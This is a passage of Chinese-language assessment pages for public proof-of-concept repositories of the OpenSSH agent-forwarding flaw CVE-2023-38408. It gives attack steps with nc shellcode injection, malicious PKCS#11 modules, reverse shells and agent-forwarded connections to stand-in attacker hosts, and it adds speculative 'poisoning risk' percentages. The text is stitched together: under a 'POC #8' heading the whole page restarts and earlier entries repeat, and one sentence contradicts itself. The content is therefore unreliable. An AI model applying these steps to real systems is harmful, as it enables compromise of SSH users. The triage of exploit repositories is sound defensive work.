该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #8

**来源**: [CVE-2023-38408-wxrdnx_CVE-2023-38408.md](../2023/CVE-2023-38408-wxrdnx_CVE-2023-38408.md)

# CVE-2023-38408

> 📦 该CVE有 **7** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md](../2023/CVE-2023-38408-LucasPDiniz_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和权限提升

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并且攻击者能够控制目标服务器文件系统

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于OpenSSH的ssh-agent的PKCS#11功能中，由于搜索路径不安全导致。攻击者可以通过控制转发的agent-socket，并在受害者机器上写入文件，从而执行任意代码。根据提供的POC，攻击者首先连接到服务器，然后利用`nc`将shellcode注入到agent的内存中，再通过`ssh-add -s`加载恶意的动态链接库，触发SIGSEGV信号来劫持程序执行流程，最终通过shellcode建立反向连接。

**漏洞利用有效性评估：**

根据漏洞描述和POC代码，该漏洞利用方法是有效的。POC详细描述了利用过程，包括如何获取SSH Agent socket，如何注入shellcode，以及如何利用SIGSEGV信号劫持控制流。

**投毒风险评估：**

仓库本身主要提供的是漏洞的利用方法和复现步骤，直接的恶意代码(比如后门)可能性较低，但仍然存在一定的风险。例如，POC中依赖的动态链接库和shellcode可能存在被替换成恶意版本的风险，例如监听反弹shell。另外，利用过程中需要手动执行一些步骤，这使得插入恶意代码的机会增加。考虑到POC代码的复杂性和潜在的风险，投毒风险估计为10%。

**漏洞利用方式：**

1.  **前提条件:** 需要OpenSSH Agent Forwarding开启，攻击者需要能够控制目标服务器的文件系统，并且目标OpenSSH版本低于9.3p2。
2.  **获取SSH Agent Socket:** 攻击者需要找到受害者SSH Agent的Socket文件（`$SSH_AUTH_SOCK`）。
3.  **注入Shellcode:**  利用`nc`命令将精心构造的shellcode注入到SSH Agent进程的内存中。Shellcode的目的是建立一个反向连接，让攻击者可以执行命令。
4.  **加载恶意动态链接库:** 使用 `ssh-add -s` 命令添加恶意的动态链接库 (`libttcn3-rt2-dynamic.so`, `libKF5SonnetUi.so.5.92.0` 和 `libns3.35-wave.so.0.0.0`)。
5.  **触发SIGSEGV:**  加载的恶意动态链接库会触发一个段错误 (SIGSEGV)。
6.  **劫持控制流:**  通过劫持SIGSEGV信号处理程序，将程序控制流导向之前注入的shellcode。
7.  **反向连接与命令执行:**  Shellcode建立一个反向连接，攻击者可以通过这个连接在受害者机器上执行任意命令。

**项目地址:** [LucasPDiniz/CVE-2023-38408](https://github.com/LucasPDiniz/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #2

**来源**: [CVE-2023-38408-Nick-Morbid_cve-2023-38408.md](../2023/CVE-2023-38408-Nick-Morbid_cve-2023-38408.md)

## CVE-2023-38408-OpenSSH-RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致完全控制受影响系统

**影响版本:** < 9.3p2

**利用条件:** 需要启用ssh-agent转发，且目标系统使用存在漏洞的OpenSSH版本。攻击者需要控制中间人服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于不充分的可信搜索路径导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以通过加载恶意的 PKCS#11 模块来执行任意代码。

**有效性:**
提供的 POC 代码 `malicious_ssh_server.py` 模拟了一个恶意的 SSH 服务器。该服务器会记录用户名和密码，并在建立通道后发送恶意负载。但是，此POC*本身*并不能直接利用 CVE-2023-38408 漏洞。它更多的是模拟了中间人攻击中恶意服务器的角色。要利用 CVE-2023-38408，需要一个恶意的PKCS#11模块。

**投毒风险:**
该存储库中，`README.md` 文件描述了漏洞本身，`malicious_ssh_server.py` 文件模拟了一个中间人攻击场景，其中攻击者运行一个恶意的 SSH 服务器来捕获凭据或进一步利用漏洞。直接的恶意代码（例如，用于直接利用CVE-2023-38408的PKCS#11模块）并存在。该POC仅仅是一个中间人服务器,捕获认证信息,进行后续操作的铺垫. 考虑到作者提供了一个中间人服务器，存在投毒的可能性，因为攻击者可能会利用这个服务器捕获的信息进行恶意操作，如进一步传播恶意软件或窃取敏感数据。但是，关键的恶意载荷（例如，实际触发 RCE 的 PKCS#11 模块）并不包含在该存储库中，降低了直接的投毒风险。 风险评估为10%。

**利用方式:**
1.  **中间人攻击:** 攻击者控制一台中间服务器。
2.  **Agent转发:**  受害者通过 SSH 连接到攻击者控制的服务器，并启用 agent 转发 (`ssh -A ...`)。
3.  **恶意 PKCS#11 模块:** 攻击者在受害者连接的服务器上放置一个恶意的 PKCS#11 模块。
4.  **加载恶意模块:** 当 ssh-agent 尝试加载 PKCS#11 模块时，由于不安全的搜索路径，它会加载攻击者的恶意模块。
5.  **远程代码执行:**  恶意模块执行攻击者的任意代码。

**项目地址:** [Nick-Morbid/cve-2023-38408](https://github.com/Nick-Morbid/cve-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #3

**来源**: [CVE-2023-38408-TX-One_CVE-2023-38408.md](../2023/CVE-2023-38408-TX-One_CVE-2023-38408.md)

## CVE-2023-38408 - OpenSSH Agent Forwarding RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 严重，允许远程攻击者在受害者机器上执行任意代码

**影响版本:** < 9.3p2

**利用条件:** 开启了 SSH agent forwarding 功能，攻击者能够控制服务端，且能写入客户端文件系统。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-38408 是 OpenSSH 中 ssh-agent 的 PKCS#11 功能中的一个漏洞，由于其搜索路径不够安全，导致远程代码执行。如果 agent 被转发到攻击者控制的系统，攻击者可以利用此漏洞。

**有效性：**
根据漏洞信息和搜索引擎结果，该漏洞被认为具有高危风险，存在可利用的 POC 代码，利用成功可以导致远程代码执行。

**投毒风险：**
提供的 POC 代码描述了一个利用场景，涉及 shellcode 注入、信号处理劫持等复杂步骤。直接判定其为恶意投毒存在难度。虽然代码中涉及从攻击者机器向受害者机器传输shellcode并通过`nc`进行连接，但这是漏洞利用过程的必要组成部分，如果不是相关领域的专业人员，可能会误判。`linuxx64.elf.stub`被用于ssh-add -s参数，但其用途尚不清晰，可能被用于特定的利用方式，或者为了绕过检测。`libttcn3-rt2-dynamic.so, libKF5SonnetUi.so.5.92.0 and libns3.35-wave.so.0.0.0`，看起来是为了触发SIGSEGV，可能存在隐藏的恶意操作，或者仅仅是构造crash的手段，风险占5%。

**利用方式：**
1.  攻击者通过 SSH 连接到服务器。
2.  攻击者获得受害者 Alice 在同一服务器上的 SSH agent socket。
3.  攻击者构造 shellcode，通过某种方式（如 netcat）将其注入到受害者 Alice 的 ssh-agent 进程中。
4.  攻击者通过 `ssh-add -s` 添加恶意的 PKCS#11 模块，触发漏洞，劫持 ssh-agent 的执行流程。
5.  利用 shellcode 执行任意命令，例如反弹 shell 或执行其他恶意操作。
6.  最后，通过nc监听端口，获取shell。

**项目地址:** [TX-One/CVE-2023-38408](https://github.com/TX-One/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #4

**来源**: [CVE-2023-38408-classic130_CVE-2023-38408.md](../2023/CVE-2023-38408-classic130_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent转发功能，并连接到受控的恶意服务器。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，利用了 ssh-agent 的 PKCS#11 功能对库搜索路径验证不足的问题。攻击者通过控制目标机器连接的 SSH 服务器，诱导受害者加载恶意的 PKCS#11 模块，从而实现远程代码执行。

**有效性：** 根据漏洞描述和搜索结果，此漏洞的POC是存在的，并且已经有公开的利用代码和分析文章。从 Qualys 的分析报告来看，漏洞是可利用的。

**投毒风险：** 提供的代码仓库中只包含一个README.md 文件和 gpl-3.0.txt 许可证文件。没有发现任何可疑的代码，因此投毒风险为 0%。

**利用方式：**
1.  **受害者开启 Agent 转发：** 受害者在使用 SSH 客户端连接远程服务器时，开启了 agent forwarding 功能 ( `-A` 参数)。
2.  **攻击者控制恶意服务器：** 攻击者控制一个 SSH 服务器，并诱使受害者连接到该服务器。
3.  **利用不安全的搜索路径：** 当 SSH 客户端尝试加载 PKCS#11 模块时，由于搜索路径验证不足，攻击者可以控制加载恶意模块。
4.  **远程代码执行：** 恶意 PKCS#11 模块被加载后，执行攻击者预先设定的恶意代码，从而控制受害者的 SSH 客户端。

简而言之，受害者连接到一个被攻击者控制的服务器，该服务器会使 ssh-agent 加载一个恶意的 PKCS#11 库，导致代码执行。此漏洞依赖于 SSH agent forwarding 功能的开启。

**项目地址:** [classic130/CVE-2023-38408](https://github.com/classic130/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #5

**来源**: [CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md](../2023/CVE-2023-38408-fazilbaig1_cve_2023_38408_scanner.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh agent forwarding，且连接到攻击者控制的系统

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408 漏洞存在于 OpenSSH 9.3p2 之前的版本中，是由于 PKCS#11 功能在 ssh-agent 中的搜索路径不够安全导致的远程代码执行漏洞。当开启 ssh agent forwarding 时，攻击者可以控制客户端连接到的服务器，通过在恶意服务器上放置恶意的 PKCS#11 共享库，诱导 ssh-agent 加载执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在可利用的公开PoC。

**投毒风险：**
提供的 PoC 代码是一个扫描器，用于检测目标主机上 OpenSSH 的版本是否小于 9.3p2，如果版本小于 9.3p2，则判断为存在漏洞。该代码主要功能是建立socket连接，获取ssh banner并进行正则匹配。虽然不能完全排除投毒的可能，但PoC本身结构简单，主要目的是版本检测，**投毒风险很低，大约为1%**，几乎可以忽略。真正的利用需要构建恶意的 PKCS#11 共享库。

**利用方式：**
1.  攻击者控制一个服务器。
2.  用户通过 SSH 连接到攻击者控制的服务器，并开启了 `ssh agent forwarding`。
3.  攻击者在服务器上放置一个恶意的 PKCS#11 共享库。
4.  当 ssh-agent 尝试加载 PKCS#11 共享库时，由于搜索路径不安全，加载了攻击者放置的恶意共享库，导致代码执行。
5.  攻击者从而可以在用户机器上执行任意代码，控制用户机器。

**项目地址:** [fazilbaig1/cve_2023_38408_scanner](https://github.com/fazilbaig1/cve_2023_38408_scanner)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #6

**来源**: [CVE-2023-38408-kali-mx_CVE-2023-38408.md](../2023/CVE-2023-38408-kali-mx_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-Agent转发RCE

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行，控制受害者机器

**影响版本:** 9.3p2之前的所有版本

**利用条件:** 需要开启ssh-agent转发，攻击者能够控制目标系统能够访问到的服务器

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-38408是OpenSSH中ssh-agent转发功能中的一个远程代码执行漏洞。由于OpenSSH的PKCS#11功能在ssh-agent中具有不够可信的搜索路径，导致如果agent被转发到攻击者控制的系统，可能导致远程代码执行。具体利用方式为攻击者诱使用户连接到恶意的服务器，该服务器会将恶意的PKCS#11模块注入到用户的ssh-agent中，当用户尝试使用ssh-agent进行身份验证时，恶意的模块将被加载并执行，从而实现远程代码执行。

**有效性：**
根据漏洞信息、搜索结果和提供的PoC代码，该漏洞是有效的。PoC代码利用了`ssh-add -s`命令允许加载PKCS#11模块的特性，通过精心构造的模块来执行恶意代码。

**投毒风险：**
PoC代码中，攻击者IP的获取方式提供了多种选择，包括用户输入、硬编码和自动获取。脚本首先清除`/tmp`目录下之前的ssh会话，然后将Alice的ssh公钥添加到root用户的`authorized_keys`中。然后等待攻击者通过SSH登录到Redqueen机器，并输入`echo ${attackerIP} > /tmp/ip.txt`。脚本会找到`SSH_AUTH_SOCK`环境变量，并使用`nc`命令向其发送shellcode，然后通过加载多个恶意的.so文件，触发segmentation fault，并最终执行注入的shellcode。

分析脚本内容，发现以下几点：

*   脚本依赖于特定的环境（TryHackMe Lab Environment），这限制了其通用性。
*   脚本中包含了一些硬编码的IP地址和密码，这可能被用于进行未经授权的访问。
*   脚本尝试向/root/.ssh/authorized_keys中写入数据，这可能会影响系统的安全性。

虽然存在上述风险，但整体来说，该PoC更像是一个为了演示漏洞原理而编写的脚本，主要的目的是为了在受害者机器上执行命令，而并非留下后门。风险在于使用者如果直接使用未修改的脚本，可能会将自己的IP地址暴露给攻击者，或者将自己的SSH密钥泄露给攻击者，但是这并非PoC作者的本意，而是使用者不当使用造成的。

因此，将投毒风险评估为1%。

**利用方式：**
1.  攻击者搭建一个恶意的SSH服务器。
2.  诱骗受害者开启ssh-agent转发并连接到该恶意服务器 (`ssh -A user@evil-server`)。
3.  恶意服务器利用`ssh-add -s`向受害者的ssh-agent中注入恶意PKCS#11模块。
4.  当受害者尝试使用ssh-agent进行身份验证时，恶意模块将被加载并执行，从而实现远程代码执行。

**项目地址:** [kali-mx/CVE-2023-38408](https://github.com/kali-mx/CVE-2023-38408)

**漏洞详情:** [CVE-2023-38408](https://nvd.nist.gov/vuln/detail/CVE-2023-38408)

---

## POC #7

**来源**: [CVE-2023-38408-mrtacojr_CVE-2023-38408.md](../2023/CVE-2023-38408-mrtacojr_CVE-2023-38408.md)

## CVE-2023-38408-OpenSSH-远程代码执行

**漏洞编号:** CVE-2023-38408

**漏洞类型:** 远程代码执行

**影响应用:** OpenSSH

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 9.3p2

**利用条件:** 需要开启ssh-agent forwarding，且连接到受攻击者控制的系统。

**POC 可用性:** 是

**投毒风险:** 80%

## 详情

CVE-2023-38408 是 OpenSSH 9.3p2 之前版本中 ssh-agent 的 PKCS#11 功能中存在的一个漏洞，由于搜索路径不安全，导致远程代码执行。如果 ssh-agent 被转发到受攻击者控制的系统，攻击者可以利用该漏洞执行任意代码。

**有效性：** 根据漏洞描述和搜索结果，该漏洞真实存在且影响OpenSSH 9.3p2之前的版本。虽然提供的POC不是直接的exp，但其功能为重新编译安装OpenSSH，如果攻击者在编译过程中注入恶意代码，则可能达到远程代码执行的目的。因此，从间接角度来看，此POC具有一定的有效性，可以作为漏洞利用的一部分。

**投毒风险：** POC代码的主要功能是下载、编译和安装OpenSSH。以下是对投毒风险的分析：
*   **下载源文件：** 从`https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/openssh/1:9.6p1-3ubuntu13.4/openssh_9.6p1.orig.tar.gz` 下载 OpenSSH 9.6p1 版本的源代码。理论上，这应该是一个可信的来源，但是攻击者可能篡改下载链接，指向包含后门的恶意代码。
*   **编译过程：** 在 `./configure` 和 `make` 步骤中，攻击者可以注入恶意代码。例如，修改Makefile以插入恶意指令，或者修改源代码本身。这是最主要的投毒风险点。
*   **systemd 服务文件：** 脚本创建了一个systemd服务文件。虽然文件本身看起来无害，但攻击者可以在`ExecStart`指令中插入恶意命令，在sshd启动时执行。

综合以上分析，此脚本存在很高的投毒风险。如果攻击者控制了脚本的执行，可以在多个环节注入恶意代码。因此，投毒风险估计为80%。

**利用方式：**
1.  **攻击者控制的服务器：** 攻击者需要搭建一个可以控制的服务器。
2.  **诱导连接：** 诱导用户使用开启agent forwarding的SSH客户端连接到该服务器（`ssh -A user@attacker.com`）。
3.  **篡改环境：** 攻击者在受害者连接的服务器上，通过篡改`LD_LIBRARY_PATH`或其它环境变量，劫持ssh-agent加载恶意PKCS#11模块。
4.  **远程代码执行：**  当ssh-agent尝试加载恶意模块时，执行攻击者预先设定的恶意代码。

**项目地址:** [mrtacojr/CVE-2023-38408](https://github.com/mrtacojr/CVE-2023-38408)

